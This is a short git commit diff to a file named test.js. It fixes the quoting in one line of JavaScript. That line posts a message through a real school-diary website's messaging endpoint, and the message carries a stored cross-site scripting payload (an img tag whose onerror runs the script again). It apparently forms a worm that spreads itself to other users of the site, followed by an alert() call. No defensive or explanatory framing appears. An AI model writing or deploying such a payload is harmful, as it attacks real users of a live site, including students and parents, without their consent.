0f075613f409a7b379316cb09352ff0ad11584a2
kristalas <105567088+kristalas@users.noreply.github.com>
2022-05-15 00:49:20 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,2 @@
-var xhr2 = new XMLHttpRequest();xhr2.open(\'POST\', \'https://www.manodienynas.lt/1/lt/action/message_new/send\', true);xhr2.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded; charset=UTF-8\');xhr2.send(\'glids=&message_label=..&message_body=\' + encodeURIComponent(\'<img src=x onerror="\' + s + \'">\'));
+var xhr2 = new XMLHttpRequest();xhr2.open('POST', 'https://www.manodienynas.lt/1/lt/action/message_new/send', true);xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');xhr2.send('glids=&message_label=..&message_body=' + encodeURIComponent('<img src=x onerror="' + s + '">'));
 alert();
